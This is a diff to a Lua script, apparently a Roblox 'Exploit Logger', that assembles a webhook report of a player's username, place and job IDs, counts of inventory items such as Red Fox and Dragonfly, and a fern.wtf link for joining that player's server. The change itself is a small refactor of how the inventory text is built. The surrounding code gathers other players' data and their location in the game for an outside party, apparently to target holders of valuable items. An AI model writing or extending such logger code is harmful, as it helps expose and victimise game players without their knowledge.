@@ -25,6 +25,11 @@ local jobId = tostring(game.JobId)
 local joinLink = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId
 local generatedAt = os.date("%Y-%m-%d %H:%M:%S")
 
+local inventoryText = 
+    "**Red Fox:** "..counts["Red Fox"].."\n"..
+    "**Raccoon:** "..counts.Raccoon.."\n"..
+    "**Dragonfly:** "..counts.Dragonfly
+
 local data = {
     username = "Exploit Logger",
     embeds = {{
@@ -34,12 +39,7 @@ local data = {
             {name = "Username", value = LocalPlayer.Name, inline = true},
             {name = "Place ID", value = placeId, inline = true},
             {name = "Job ID", value = jobId, inline = false},
-            {name = "Inventory Counts", value =
-                "Red Fox: "..counts["Red Fox"].."\n"..
-                "Raccoon: "..counts.Raccoon.."\n"..
-                "Dragonfly: "..counts.Dragonfly,
-                inline = false
-            },
+            {name = "Inventory Counts", value = inventoryText, inline = false},
             {name = "Join Server", value = "[Click to Join Game Instance]("..joinLink..")", inline = false},
             {name = "Generated at", value = generatedAt, inline = false},
         }
